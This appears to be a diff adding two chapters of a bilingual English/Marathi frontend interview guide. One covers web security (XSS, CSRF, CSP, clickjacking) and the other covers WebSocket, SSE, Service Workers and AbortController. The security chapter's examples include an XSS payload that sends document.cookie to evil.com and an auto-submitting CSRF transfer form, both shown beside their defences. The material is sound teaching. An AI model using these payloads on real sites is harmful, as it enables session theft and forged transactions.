+<h2>1. XSS (Cross-Site Scripting)</h2>
+<div class="box def"><b>Definition:</b> <b>XSS</b> is an attack where an attacker gets their own JavaScript to run on YOUR website, in other users' browsers. Because the script runs on your origin, it can read cookies (if not HttpOnly), localStorage, the page content, and make requests as the user. It happens when untrusted input is inserted into the page as HTML/JS without escaping.</div>
+<table><tr><th>Type</th><th>Where the payload comes from</th><th>Example</th></tr>
+<tr><td>Stored</td><td>Saved in the database, shown to every visitor</td><td>A comment containing &lt;img src=x onerror=...&gt;</td></tr>
+<tr><td>Reflected</td><td>In the request (URL), echoed by the server</td><td>/search?q=&lt;script&gt;...&lt;/script&gt;</td></tr>
+<tr><td>DOM-based</td><td>Client-side JS puts URL/input data into the DOM</td><td>el.innerHTML = location.hash.slice(1)</td></tr></table>
+<div class="code-title">Example 1: a DOM-based XSS bug</div>
+<pre>// URL: https://shop.com/#&lt;img src=x onerror="fetch('https://evil.com?c='+document.cookie)"&gt;
+const name = decodeURIComponent(location.hash.slice(1));
+document.querySelector("#welcome").innerHTML = "Hello " + name;   // ❌ runs the attacker's code</pre>
+<div class="ex"><b>What happens:</b> innerHTML parses the string as HTML. The img fails to load, so onerror runs and sends the user's cookies to the attacker.
+<br><span class="dis">⚠ &lt;script&gt; tags inserted with innerHTML do NOT run, but event-handler attributes (onerror, onload) DO, so "I blocked &lt;script&gt;" is not protection.</span></div>
+<div class="fig"><svg viewBox="0 0 640 140" width="600"><g font-family="sans-serif" font-size="12">
+<rect x="10" y="45" width="130" height="50" rx="8" fill="#fdecea" stroke="#c0392b"/><text x="75" y="66" text-anchor="middle" font-weight="bold">Attacker</text><text x="75" y="84" text-anchor="middle" font-size="11">posts payload</text>
+<rect x="250" y="45" width="140" height="50" rx="8" fill="#eef4ff" stroke="#2c5aa0"/><text x="320" y="66" text-anchor="middle" font-weight="bold">Your site</text><text x="320" y="84" text-anchor="middle" font-size="11">shows it unescaped</text>
+<rect x="500" y="45" width="130" height="50" rx="8" fill="#fff7e6" stroke="#f0a020"/><text x="565" y="66" text-anchor="middle" font-weight="bold">Victim's browser</text><text x="565" y="84" text-anchor="middle" font-size="11">runs the script</text>
+<line x1="140" y1="70" x2="250" y2="70" stroke="#c0392b" stroke-width="2"/><line x1="390" y1="70" x2="500" y2="70" stroke="#c0392b" stroke-width="2"/>
+<path d="M565 95 Q 320 140 75 95" fill="none" stroke="#c0392b" stroke-dasharray="5,4"/><text x="320" y="132" text-anchor="middle" fill="#c0392b" font-size="11">cookies / tokens / data sent to the attacker</text></g></svg>
+<div class="cap">Figure 149: Stored XSS: the attacker's script runs inside the victim's session on your origin.</div></div>
+<div class="box mr">XSS म्हणजे attacker चा JavaScript आपल्या website वर दुसऱ्या users च्या browser मध्ये चालणे. user input escape न करता innerHTML मध्ये टाकल्यास हे होते. Stored (DB मध्ये), Reflected (URL मधून) आणि DOM-based (client JS मधून) असे तीन प्रकार.</div>
+
+<h2>2. Preventing XSS</h2>
+<div class="code-title">Example 2: safe ways to show user input</div>
+<pre>// ─── ✅ Use textContent (treated as text, never parsed as HTML) ───
+welcome.textContent = "Hello " + name;
+
+// ─── ✅ Build elements instead of HTML strings ───
+const li = document.createElement("li");
+li.textContent = comment.text;
+list.append(li);
+
+// ─── ✅ Escape if you must build HTML ───
+const escapeHTML = s =&gt; s.replace(/[&amp;&lt;&gt;"']/g, c =&gt;
+  ({ "&amp;": "&amp;amp;", "&lt;": "&amp;lt;", "&gt;": "&amp;gt;", '"': "&amp;quot;", "'": "&amp;#39;" }[c]));
+console.log(escapeHTML('&lt;img src=x onerror="alert(1)"&gt;'));
+// → &amp;lt;img src=x onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;
+
+// ─── ✅ Need real HTML (rich text)? Sanitize with a library ───
+el.innerHTML = DOMPurify.sanitize(userHtml);   // removes scripts &amp; event handlers</pre>
+<div class="ex"><b>What happens:</b> textContent and createElement never interpret markup; escaping turns special characters into entities that display as text.
+<br><span class="adv">✅ Frameworks (React {value}, Vue {{ value }}, Angular) escape by default. The danger is the escape hatches: dangerouslySetInnerHTML, v-html, [innerHTML].</span>
+<br><span class="dis">⚠ Also dangerous: eval, new Function, setTimeout("string"), href="javascript:...", and inserting into inline event handlers. Validate URLs (allow only http/https).</span></div>
+<ul class="pl"><li>Store tokens in <b>HttpOnly</b> cookies so a successful XSS can't read them (Chapter 71).</li><li>Add a <b>Content Security Policy</b> as a second line of defence (section 5).</li><li>Escape on OUTPUT, for the right context (HTML body, attribute, URL, JS).</li></ul>
+<div class="box mr">XSS टाळण्यासाठी: innerHTML ऐवजी textContent वापरा, string ऐवजी createElement ने elements बनवा, HTML लागल्यास DOMPurify ने sanitize करा. eval आणि javascript: URLs टाळा. Token HttpOnly cookie मध्ये ठेवा आणि CSP लावा.</div>
+
+<h2>3. CSRF (Cross-Site Request Forgery)</h2>
+<div class="box def"><b>Definition:</b> <b>CSRF</b> tricks a logged-in user's browser into sending an unwanted request to your site (transfer money, change email). It works because the browser automatically attaches the site's cookies to requests, even when the request is triggered from ANOTHER site. The attacker can't read the response; they just make the action happen.</div>
+<div class="code-title">Example 3: a CSRF attack page (on evil.com)</div>
+<pre>&lt;!-- user is logged in to bank.com in another tab --&gt;
+&lt;form action="https://bank.com/transfer" method="POST" id="f"&gt;
+  &lt;input type="hidden" name="to" value="attacker"&gt;
+  &lt;input type="hidden" name="amount" value="10000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById("f").submit();&lt;/script&gt;</pre>
+<div class="ex"><b>What happens:</b> the form posts to bank.com; the browser sends the bank's session cookie with it (unless SameSite blocks it), so the bank thinks the user made the transfer.
+<br><span class="dis">⚠ CORS does NOT stop this: a simple form POST is not a CORS request, and CORS only protects reading the response (Chapter 72).</span></div>
+<div class="fig"><svg viewBox="0 0 640 130" width="600"><g font-family="sans-serif" font-size="12">
+<rect x="10" y="40" width="150" height="50" rx="8" fill="#fdecea" stroke="#c0392b"/><text x="85" y="61" text-anchor="middle" font-weight="bold">evil.com page</text><text x="85" y="79" text-anchor="middle" font-size="11">auto-submits a form</text>
+<rect x="245" y="40" width="150" height="50" rx="8" fill="#fff7e6" stroke="#f0a020"/><text x="320" y="61" text-anchor="middle" font-weight="bold">User's browser</text><text x="320" y="79" text-anchor="middle" font-size="11">adds bank.com cookie</text>
+<rect x="480" y="40" width="150" height="50" rx="8" fill="#eef4ff" stroke="#2c5aa0"/><text x="555" y="61" text-anchor="middle" font-weight="bold">bank.com</text><text x="555" y="79" text-anchor="middle" font-size="11">sees a valid session</text>
+<line x1="160" y1="65" x2="245" y2="65" stroke="#c0392b" stroke-width="2"/><line x1="395" y1="65" x2="480" y2="65" stroke="#c0392b" stroke-width="2"/>
+<text x="320" y="118" text-anchor="middle" fill="#27ae60">✔ fix: SameSite cookies + CSRF token the attacker can't know</text></g></svg>
+<div class="cap">Figure 150: CSRF abuses cookies that the browser attaches automatically.</div></div>
+<div class="box mr">CSRF मध्ये user login असताना दुसरी website त्याच्या browser कडून आपल्या site ला request पाठवते. browser cookie आपोआप जोडतो, म्हणून server ला वाटते user नेच request केली. CORS हे थांबवत नाही.</div>
+
+<h2>4. Preventing CSRF</h2>
+<div class="code-title">Example 4: SameSite cookie + CSRF token</div>
+<pre>// ─── Server: set the session cookie ───
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
+
+// ─── Server: put a random token in the page (or a readable cookie) ───
+&lt;meta name="csrf-token" content="r4nd0m-per-session"&gt;
+
+// ─── Client: send it in a custom header with every state-changing request ───
+const token = document.querySelector('meta[name="csrf-token"]').content;
+fetch("/transfer", {
+  method: "POST",
+  headers: { "Content-Type": "application/json", "X-CSRF-Token": token },
+  body: JSON.stringify({ to: "friend", amount: 100 }),
+});
+// Server: reject the request if X-CSRF-Token doesn't match the session's token.</pre>
+<div class="ex"><b>What happens:</b> SameSite=Lax stops the browser from sending the cookie on cross-site POSTs; the token is a secret that evil.com can't read (same-origin policy), so it can't forge a valid request.
+<br><span class="adv">✅ Also: use POST/PUT/DELETE (never GET) for actions; check Origin/Referer headers; re-ask for the password on very sensitive actions.</span></div>
+<table><tr><th>SameSite</th><th>Cookie sent on cross-site requests?</th></tr>
+<tr><td>Strict</td><td>Never (even clicking a link from another site arrives "logged out")</td></tr>
+<tr><td>Lax (browser default)</td><td>Only top-level GET navigations (clicking a link), not POSTs, iframes or fetch</td></tr>
+<tr><td>None</td><td>Always (requires Secure); needed for third-party embeds</td></tr></table>
+<div class="box mr">CSRF टाळण्यासाठी: cookie ला SameSite=Lax/Strict लावा, प्रत्येक बदल करणाऱ्या request सोबत random CSRF token पाठवा आणि server वर तपासा. GET request ने कधीही data बदलू नका.</div>
+
+<h2>5. Content Security Policy (CSP)</h2>
+<div class="box def"><b>Definition:</b> <b>Content Security Policy</b> is an HTTP response header that tells the browser which sources of scripts, styles, images, frames, etc. are allowed on the page. Anything not on the allow-list is blocked, so even if an attacker injects markup (XSS), their inline or external script does not run.</div>
+<div class="code-title">Example 5: a strict CSP header</div>
+<pre>Content-Security-Policy:
+  default-src 'self';                          // everything from our own origin only
+  script-src 'self' 'nonce-r4nd0m123';         // + inline scripts carrying this nonce
+  style-src 'self' https://fonts.googleapis.com;
+  img-src 'self' data: https:;
+  connect-src 'self' https://api.example.com;  // fetch / XHR / WebSocket targets
+  frame-ancestors 'none';                      // nobody may iframe us (anti-clickjacking)
+  object-src 'none'; base-uri 'self'
+
+&lt;script nonce="r4nd0m123"&gt;init();&lt;/script&gt;   &lt;!-- ✅ allowed (nonce matches) --&gt;
+&lt;script&gt;alert(1)&lt;/script&gt;                    &lt;!-- ❌ blocked: no nonce --&gt;
+&lt;img src=x onerror="alert(1)"&gt;               &lt;!-- ❌ inline handler blocked --&gt;</pre>
+<div class="ex"><b>What happens:</b> the browser checks every script/style/request against the policy and blocks (and reports in the console) anything not allowed. The nonce must be random and new on every page load.
+<br><span class="adv">✅ Start with Content-Security-Policy-Report-Only to see what would break, then enforce.</span>
+<br><span class="dis">⚠ 'unsafe-inline' and 'unsafe-eval' remove most of the XSS protection. CSP is a second layer, not a replacement for escaping.</span></div>
+<div class="box mr">CSP हा HTTP header आहे जो browser ला सांगतो की कोणत्या ठिकाणाहून scripts, styles, images load करायला परवानगी आहे. Inject केलेला script allow-list मध्ये नसल्यामुळे चालत नाही. हे XSS विरुद्ध दुसरे संरक्षण आहे.</div>
+
+<h2>6. Clickjacking &amp; Other Security Headers</h2>
+<div class="box def"><b>Definition:</b> <b>Clickjacking</b> loads your site in an invisible iframe on top of an attacker's page, so the user clicks your real buttons ("Delete account") while thinking they click something else. Prevent it with <code>frame-ancestors</code> in CSP or the older <code>X-Frame-Options: DENY</code>.</div>
+<table><tr><th>Header</th><th>Purpose</th></tr>
+<tr><td>Content-Security-Policy</td><td>Allow-list of sources; frame-ancestors</td></tr>
+<tr><td>X-Frame-Options: DENY</td><td>Old way to block iframing</td></tr>
+<tr><td>Strict-Transport-Security</td><td>Always use HTTPS (HSTS)</td></tr>
+<tr><td>X-Content-Type-Options: nosniff</td><td>Don't guess MIME types</td></tr>
+<tr><td>Referrer-Policy</td><td>Limit the URL sent in Referer</td></tr>
+<tr><td>Set-Cookie: HttpOnly; Secure; SameSite</td><td>No JS access, HTTPS only, CSRF protection</td></tr></table>
+<div class="box more"><b>Extra Details: other frontend risks</b>
+<ul class="pl"><li><b>target="_blank"</b> without rel="noopener": the new page could change window.opener.location (modern browsers now default to noopener).</li><li><b>Secrets in frontend code</b>: anything in your JS bundle is public; keep API secrets on the server.</li><li><b>Dependencies</b>: run npm audit; pin versions; use Subresource Integrity (integrity="sha384-...") for CDN scripts.</li><li><b>Prototype pollution</b>: merging untrusted JSON with keys like __proto__ can change Object.prototype; skip those keys or use Object.create(null) (Chapter 57).</li></ul></div>
+<div class="box mr">Clickjacking मध्ये आपली site invisible iframe मध्ये उघडून user कडून चुकीचे click करवले जातात. उपाय: CSP frame-ancestors 'none' किंवा X-Frame-Options: DENY. याशिवाय HSTS, nosniff, HttpOnly/Secure/SameSite cookies वापरा.</div>
+
+<h2>7. Interview Questions (Detailed)</h2>
+<div class="q">Q1. What is XSS and how do you prevent it?</div>
+<p>Injecting attacker JavaScript into your page. Prevent: escape output / textContent, avoid innerHTML with user data, sanitize rich HTML (DOMPurify), no eval or javascript: URLs, HttpOnly cookies, CSP.</p>
+<div class="q">Q2. What is CSRF and how is it different from XSS?</div>
+<p>CSRF makes the user's browser send an authenticated request from another site; the attacker can't run code on your site or read responses. XSS runs attacker code ON your site, which can do everything CSRF can and more (and bypass CSRF tokens).</p>
+<div class="q">Q3. Where should you store a JWT: localStorage or a cookie?</div>
+<p>localStorage is readable by any XSS script. An HttpOnly, Secure, SameSite cookie can't be read by JS (protects from token theft) but needs CSRF protection. Most security guides prefer the HttpOnly cookie.</p>
+<div class="q">Q4. Does CORS protect against CSRF?</div>
+<p>No. CORS controls whether a page may READ a cross-origin response. Simple form posts are sent anyway. Use SameSite cookies and CSRF tokens.</p>
+<div class="q">Q5. What is a CSP nonce?</div>
+<p>A random value sent in the CSP header and on allowed inline script tags; injected scripts don't know it, so they are blocked.</p>
+<div class="q">Q6. Is React safe from XSS?</div>
+<p>It escapes {values} by default, but dangerouslySetInnerHTML, href={userUrl} with javascript:, and direct DOM access can still introduce XSS.</p>
+<div class="q">Q7. Output-based questions</div>
+<pre>const div = document.createElement("div");
+div.innerHTML = "&lt;b&gt;hi&lt;/b&gt;";
+console.log(div.textContent, div.children.length);   // → hi 1   (parsed as HTML)
+
+div.textContent = "&lt;b&gt;hi&lt;/b&gt;";
+console.log(div.textContent, div.children.length);   // → &lt;b&gt;hi&lt;/b&gt; 0   (plain text)
+console.log(div.innerHTML);                          // → &amp;lt;b&amp;gt;hi&amp;lt;/b&amp;gt;  (escaped)
+
+div.innerHTML = "&lt;script&gt;console.log('x')&lt;/script&gt;";
+// → (nothing logged)  scripts inserted via innerHTML don't execute… but &lt;img onerror&gt; does!</pre>
+<div class="ex"><ul class="pl"><li><b>What happens:</b> innerHTML parses markup, textContent stores text and the browser escapes it when you read innerHTML back; inserted script tags don't run, event handlers do.</li><li><b>Output:</b> as shown.</li></ul></div>
+
+<h2>8. Quick Revision Summary</h2>
+<table><tr><th>Attack</th><th>What</th><th>Main defences</th></tr>
+<tr><td>XSS</td><td>Attacker JS runs on your site</td><td>textContent/escape, sanitize, no eval, HttpOnly, CSP</td></tr>
+<tr><td>CSRF</td><td>Forged request with user's cookies</td><td>SameSite, CSRF token, no GET for changes, Origin check</td></tr>
+<tr><td>Clickjacking</td><td>Hidden iframe tricks clicks</td><td>frame-ancestors 'none' / X-Frame-Options</td></tr>
+<tr><td>Token theft</td><td>JS reads tokens</td><td>HttpOnly cookies</td></tr></table>
+<div class="box mr">थोडक्यात: XSS = आपल्या site वर दुसऱ्याचा script (escape करा, CSP लावा). CSRF = user च्या cookie ने खोटी request (SameSite + token). Clickjacking = लपलेले iframe (frame-ancestors). Token HttpOnly cookie मध्ये ठेवा.</div>
+
+<!-- ===== END OF CHAPTER 83 ===== -->
+
+<div class="chapter">Chapter 84: Real-time &amp; Offline: WebSocket, SSE &amp; Service Worker<small>polling vs long polling · WebSocket · Server-Sent Events · when to use what · Service Worker lifecycle · caching strategies · offline · PWA · fetch with AbortController</small></div>
+<div class="toc"><b>CHAPTER 84 INDEX</b>
+<ol><li>Getting Live Data: Polling, Long Polling, SSE, WebSocket</li><li>WebSocket</li><li>Server-Sent Events (SSE)</li><li>Service Worker</li><li>Caching Strategies</li><li>Cancelling Requests with AbortController</li><li>Interview Questions (Detailed)</li><li>Quick Revision Summary</li></ol></div>
+<div class="box more"><b>Note:</b> this chapter has no source folder. It was added to fill interview gaps (chat apps, notifications, offline support).</div>
+
+<h2>1. Getting Live Data: Polling, Long Polling, SSE, WebSocket</h2>
+<div class="box def"><b>Definition:</b> HTTP is request → response: the server can't speak first. To get live updates the client can <b>poll</b> (ask every few seconds), <b>long-poll</b> (the server holds the request open until there is data), use <b>Server-Sent Events</b> (one long HTTP response that streams server → client) or open a <b>WebSocket</b> (a persistent, two-way connection).</div>
+<table><tr><th></th><th>Short polling</th><th>Long polling</th><th>SSE</th><th>WebSocket</th></tr>
+<tr><td>Direction</td><td>Client asks</td><td>Client asks, server waits</td><td>Server → client</td><td>Both ways</td></tr>
+<tr><td>Connection</td><td>New request each time</td><td>New request after each reply</td><td>One HTTP stream</td><td>One upgraded TCP connection</td></tr>
+<tr><td>Latency / overhead</td><td>High / high</td><td>Low / medium</td><td>Low / low</td><td>Lowest / lowest</td></tr>
+<tr><td>Auto-reconnect</td><td>n/a</td><td>Manual</td><td>Built-in</td><td>Manual</td></tr>
+<tr><td>Use for</td><td>Rare updates</td><td>Fallback</td><td>Feeds, notifications, AI token streaming</td><td>Chat, games, collaboration</td></tr></table>
+<div class="box mr">HTTP मध्ये server स्वतःहून data पाठवू शकत नाही. म्हणून polling (वारंवार विचारणे), long polling, SSE (server → client stream) किंवा WebSocket (दोन्ही बाजूंनी सतत connection) वापरतात.</div>
+
+<h2>2. WebSocket</h2>
+<div class="box def"><b>Definition:</b> <b>WebSocket</b> is a protocol (ws:// or wss://) that starts as an HTTP request with an <code>Upgrade</code> header and then becomes a persistent, full-duplex connection: both the client and the server can send messages at any time with very little overhead.</div>
+<div class="code-title">Example 1: a chat client</div>
+<pre>const ws = new WebSocket("wss://chat.example.com");
+
+ws.addEventListener("open", () =&gt; ws.send(JSON.stringify({ type: "join", room: "js" })));
+ws.addEventListener("message", (e) =&gt; {
+  const msg = JSON.parse(e.data);          // data arrives as a string (or Blob/ArrayBuffer)
+  render(msg);
+});
+ws.addEventListener("close", (e) =&gt; console.log("closed", e.code));
+ws.addEventListener("error", () =&gt; console.log("error"));
+
+sendBtn.onclick = () =&gt; {
+  if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ type: "msg", text: input.value }));
+};</pre>
+<div class="ex"><b>What happens:</b> open fires when the handshake finishes; send() pushes a message; message fires for every message from the server.
+<br><span class="dis">⚠ send() before open throws an error (readyState CONNECTING); WebSocket doesn't reconnect by itself; cookies are sent on the handshake, but you can't set custom headers (send a token in the first message or the URL).</span></div>
+<div class="code-title">Example 2: reconnect with exponential backoff</div>
+<pre>function connect(attempt = 0) {
+  const ws = new WebSocket(URL);
+  ws.onopen = () =&gt; { attempt = 0; };
+  ws.onclose = () =&gt; {
+    const delay = Math.min(1000 * 2 ** attempt, 30000);   // 1s, 2s, 4s … max 30s
+    setTimeout(() =&gt; connect(attempt + 1), delay);
+  };
+  return ws;
+}</pre>
+<div class="ex"><b>What happens:</b> every time the connection closes, a new one is tried after a growing delay, so a down server isn't hammered.
+<br><span class="adv">✅ Also add a heartbeat (ping every ~30 s) to detect dead connections; libraries like Socket.IO do this for you.</span></div>
+<div class="fig"><svg viewBox="0 0 640 150" width="600"><g font-family="sans-serif" font-size="12">
+<rect x="20" y="15" width="120" height="120" rx="8" fill="#eef4ff" stroke="#2c5aa0"/><text x="80" y="80" text-anchor="middle" font-weight="bold">Client</text>
+<rect x="500" y="15" width="120" height="120" rx="8" fill="#fff7e6" stroke="#f0a020"/><text x="560" y="80" text-anchor="middle" font-weight="bold">Server</text>
+<line x1="140" y1="35" x2="500" y2="35" stroke="#2c5aa0" stroke-width="2"/><text x="320" y="30" text-anchor="middle" font-size="11">HTTP GET + Upgrade: websocket →</text>
+<line x1="500" y1="55" x2="140" y2="55" stroke="#f0a020" stroke-width="2"/><text x="320" y="50" text-anchor="middle" font-size="11">← 101 Switching Protocols</text>
+<line x1="140" y1="85" x2="500" y2="85" stroke="#27ae60" stroke-width="2"/><text x="320" y="80" text-anchor="middle" font-size="11" fill="#27ae60">message →</text>
+<line x1="500" y1="105" x2="140" y2="105" stroke="#27ae60" stroke-width="2"/><text x="320" y="100" text-anchor="middle" font-size="11" fill="#27ae60">← message (server can push any time)</text>
+<text x="320" y="128" text-anchor="middle" font-size="11">same connection stays open</text></g></svg>
+<div class="cap">Figure 151: The WebSocket handshake upgrades one HTTP request into a two-way channel.</div></div>
+<div class="box mr">WebSocket मध्ये एकदा connection उघडले की client आणि server दोघेही कधीही message पाठवू शकतात. Chat, games साठी उत्तम. Connection तुटल्यास स्वतः reconnect होत नाही, म्हणून backoff सोबत reconnect लिहा.</div>
+
+<h2>3. Server-Sent Events (SSE)</h2>
+<div class="box def"><b>Definition:</b> <b>Server-Sent Events</b> use <code>EventSource</code> to keep one HTTP response open; the server writes <code>text/event-stream</code> messages into it. It is one-way (server → client), text only, and reconnects automatically.</div>
+<div class="code-title">Example 3: live notifications with EventSource</div>
+<pre>const es = new EventSource("/notifications");        // cookies sent (same origin)
+es.onmessage = (e) =&gt; showToast(JSON.parse(e.data));   // default "message" events
+es.addEventListener("price", (e) =&gt; updatePrice(e.data)); // named events
+es.onerror = () =&gt; console.log("lost connection, browser retries automatically");
+// es.close();   // stop
+
+// server sends (plain text):
+// event: price
+// data: {"symbol":"ABC","value":101.5}
+// (blank line ends one message)</pre>
+<div class="ex"><b>What happens:</b> each block of "data:" lines followed by a blank line becomes one event on the client.
+<br><span class="adv">✅ Simpler than WebSocket when the client only needs to listen; works over normal HTTP (proxies, HTTP/2).</span>
+<br><span class="dis">⚠ One-way, text only; over HTTP/1.1 browsers allow only ~6 connections per domain.</span></div>
+<div class="box mr">SSE (EventSource) मध्ये server एकाच HTTP connection वरून client ला सतत messages पाठवतो. फक्त एकाच दिशेने, आणि आपोआप reconnect होते. Notifications, live feed साठी योग्य.</div>
+
+<h2>4. Service Worker</h2>
+<div class="box def"><b>Definition:</b> A <b>Service Worker</b> is a special background worker that sits between your page and the network, like a programmable proxy. It can intercept every fetch, serve responses from a cache (offline support), receive push notifications and do background sync. It has no DOM access, works only on HTTPS (or localhost) and has its own lifecycle: <b>register → install → activate → fetch</b>.</div>
+<div class="code-title">Example 4: register it from the page</div>
+<pre>// main.js
+if ("serviceWorker" in navigator) {
+  navigator.serviceWorker.register("/sw.js")
+    .then(reg =&gt; console.log("SW scope:", reg.scope))
+    .catch(err =&gt; console.log("SW failed:", err));
+}</pre>
+<div class="code-title">Example 5: sw.js: pre-cache on install, serve from cache on fetch</div>
+<pre>const CACHE = "app-v2";
+const ASSETS = ["/", "/index.html", "/app.js", "/style.css", "/offline.html"];
+
+self.addEventListener("install", (event) =&gt; {
+  event.waitUntil(caches.open(CACHE).then(c =&gt; c.addAll(ASSETS)));   // pre-cache
+});
+
+self.addEventListener("activate", (event) =&gt; {                        // delete old caches
+  event.waitUntil(caches.keys().then(keys =&gt;
+    Promise.all(keys.filter(k =&gt; k !== CACHE).map(k =&gt; caches.delete(k)))));
+});
+
+self.addEventListener("fetch", (event) =&gt; {                           // cache first
+  event.respondWith(
+    caches.match(event.request).then(hit =&gt;
+      hit || fetch(event.request).catch(() =&gt; caches.match("/offline.html")))
+  );
+});</pre>
+<div class="ex"><b>What happens:</b> on install the app shell is cached; on activate old versions are removed; every request is answered from the cache if possible, otherwise from the network, and if offline an offline page is shown.
+<br><span class="dis">⚠ A new sw.js waits ("waiting" state) until all tabs using the old one are closed; use self.skipWaiting() + clients.claim() to activate immediately. Forgetting to change the cache name means users keep old files.</span></div>
+<div class="fig"><svg viewBox="0 0 640 120" width="600"><g font-family="sans-serif" font-size="12">
+<rect x="10" y="40" width="110" height="40" rx="6" fill="#eef4ff" stroke="#2c5aa0"/><text x="65" y="65" text-anchor="middle">register()</text>
+<rect x="165" y="40" width="110" height="40" rx="6" fill="#fff7e6" stroke="#f0a020"/><text x="220" y="58" text-anchor="middle">install</text><text x="220" y="73" text-anchor="middle" font-size="10">pre-cache</text>
+<rect x="320" y="40" width="110" height="40" rx="6" fill="#fff7e6" stroke="#f0a020"/><text x="375" y="58" text-anchor="middle">activate</text><text x="375" y="73" text-anchor="middle" font-size="10">clean old caches</text>
+<rect x="475" y="40" width="155" height="40" rx="6" fill="#eafaf1" stroke="#27ae60"/><text x="552" y="58" text-anchor="middle">fetch / push / sync</text><text x="552" y="73" text-anchor="middle" font-size="10">controls the pages</text>
+<line x1="120" y1="60" x2="165" y2="60" stroke="#555" stroke-width="2"/><line x1="275" y1="60" x2="320" y2="60" stroke="#555" stroke-width="2"/><line x1="430" y1="60" x2="475" y2="60" stroke="#555" stroke-width="2"/>
+<text x="320" y="105" text-anchor="middle" fill="#c0392b" font-size="11">HTTPS only · no DOM · can be stopped by the browser any time (no global state)</text></g></svg>
+<div class="cap">Figure 152: The Service Worker lifecycle.</div></div>
+<div class="box mr">Service Worker हा page आणि network मधला proxy आहे. तो प्रत्येक request अडवून cache मधून उत्तर देऊ शकतो, त्यामुळे app offline चालते (PWA). Lifecycle: register → install (cache भरणे) → activate (जुने cache काढणे) → fetch. फक्त HTTPS वर चालतो आणि DOM नाही.</div>
+
+<h2>5. Caching Strategies</h2>
+<table><tr><th>Strategy</th><th>How</th><th>Best for</th></tr>
+<tr><td>Cache first</td><td>Cache, else network</td><td>Versioned static files (JS, CSS, fonts)</td></tr>
+<tr><td>Network first</td><td>Network, else cache</td><td>HTML, API data that should be fresh</td></tr>
+<tr><td>Stale-while-revalidate</td><td>Return cache now, update cache from network in background</td><td>Avatars, non-critical API data</td></tr>
+<tr><td>Network only / cache only</td><td>One source</td><td>Payments / pre-cached shell</td></tr></table>
+<div class="code-title">Example 6: stale-while-revalidate</div>
+<pre>self.addEventListener("fetch", (event) =&gt; {
+  event.respondWith(caches.open("runtime").then(async cache =&gt; {
+    const cached = await cache.match(event.request);
+    const network = fetch(event.request).then(res =&gt; {
+      cache.put(event.request, res.clone());    // a Response body can be read only once → clone
+      return res;
+    });
+    return cached || network;                   // fast answer, fresh next time
+  }));
+});</pre>
+<div class="ex"><b>What happens:</b> the user gets the cached version instantly; the network response quietly refreshes the cache for the next visit.
+<br><span class="adv">✅ Libraries like Workbox implement these strategies for you.</span></div>
+<div class="box mr">Cache first: आधी cache (static files). Network first: आधी network (ताजा data). Stale-while-revalidate: लगेच cache मधून द्या आणि मागे network वरून cache update करा.</div>
+
+<h2>6. Cancelling Requests with AbortController</h2>
+<div class="box def"><b>Definition:</b> <code>AbortController</code> creates a <code>signal</code> you pass to fetch (or addEventListener, or your own async code). Calling <code>controller.abort()</code> cancels the request, and the fetch promise rejects with an <code>AbortError</code>.</div>
+<div class="code-title">Example 7: cancel the previous search request</div>
+<pre>let controller;
+async function search(q) {
+  controller?.abort();                       // cancel the older, slower request
+  controller = new AbortController();
+  try {
+    const res = await fetch(`/api/search?q=${encodeURIComponent(q)}`, { signal: controller.signal });
+    render(await res.json());
+  } catch (err) {
+    if (err.name === "AbortError") return;   // expected, ignore
+    throw err;
+  }
+}
+// timeout shortcut: fetch(url, { signal: AbortSignal.timeout(5000) })</pre>
+<div class="ex"><b>What happens:</b> every new keystroke aborts the previous request, so an old slow response can never overwrite newer results (a race condition). Combine with debouncing (Chapter 79).
+<br><span class="adv">✅ One signal can also remove many event listeners at once: addEventListener("x", fn, { signal }).</span></div>
+<div class="box mr">AbortController ने चालू fetch request रद्द करता येते. Search box मध्ये जुनी request cancel केल्यास जुना उशिरा आलेला response नवीन results वर overwrite होत नाही.</div>
+
+<h2>7. Interview Questions (Detailed)</h2>
+<div class="q">Q1. WebSocket vs SSE vs polling: which do you choose?</div>
+<p>Two-way, low-latency (chat, multiplayer, collaborative editing) → WebSocket. Server-to-client only (notifications, live scores, streaming AI text) → SSE. Rare updates or very simple setup → polling.</p>
+<div class="q">Q2. How does a WebSocket connection start?</div>
+<p>As an HTTP GET with Upgrade: websocket and Connection: Upgrade headers; the server answers 101 Switching Protocols and the TCP connection is reused for WebSocket frames.</p>
+<div class="q">Q3. Service Worker vs Web Worker?</div>
+<p>Both run off the main thread without DOM access. A Web Worker belongs to one page and does computation. A Service Worker is shared by all pages in its scope, intercepts network requests, works when pages are closed (push, sync) and is event-driven.</p>
+<div class="q">Q4. Why does my updated service worker not take effect?</div>
+<p>The new worker installs but waits until no tab uses the old one. Close all tabs, or call skipWaiting() in install and clients.claim() in activate.</p>
+<div class="q">Q5. What is a PWA?</div>
+<p>A Progressive Web App: a website with HTTPS, a Service Worker (offline/caching) and a Web App Manifest (name, icons, display mode), so it can be installed and behave like an app.</p>
+<div class="q">Q6. How do you avoid race conditions in search-as-you-type?</div>
+<p>Debounce the input and abort the previous fetch with AbortController (or ignore responses whose request id is not the latest).</p>
+<div class="q">Q7. Output-based questions</div>
+<pre>const ws = new WebSocket("wss://echo.example.com");
+ws.send("hi");
+// → Uncaught DOMException: Failed to execute 'send' on 'WebSocket': Still in CONNECTING state.
+
+const c = new AbortController();
+fetch("/slow", { signal: c.signal }).catch(e =&gt; console.log(e.name));
+c.abort();
+// → AbortError
+
+console.log(WebSocket.CONNECTING, WebSocket.OPEN, WebSocket.CLOSING, WebSocket.CLOSED);
+// → 0 1 2 3</pre>
+<div class="ex"><ul class="pl"><li><b>What happens:</b> send() is only valid after open; abort() rejects the fetch with AbortError; readyState constants are 0–3.</li><li><b>Output:</b> as shown.</li></ul></div>
+
+<h2>8. Quick Revision Summary</h2>
+<table><tr><th>Tool</th><th>Remember</th></tr>
+<tr><td>WebSocket</td><td>Two-way, persistent, manual reconnect</td></tr>
+<tr><td>SSE / EventSource</td><td>Server → client, text, auto-reconnect</td></tr>
+<tr><td>Long polling</td><td>Server holds the request until data</td></tr>
+<tr><td>Service Worker</td><td>Network proxy, cache, offline, push; HTTPS</td></tr>
+<tr><td>Lifecycle</td><td>register → install → activate → fetch</td></tr>
+<tr><td>AbortController</td><td>Cancel fetch → AbortError</td></tr></table>
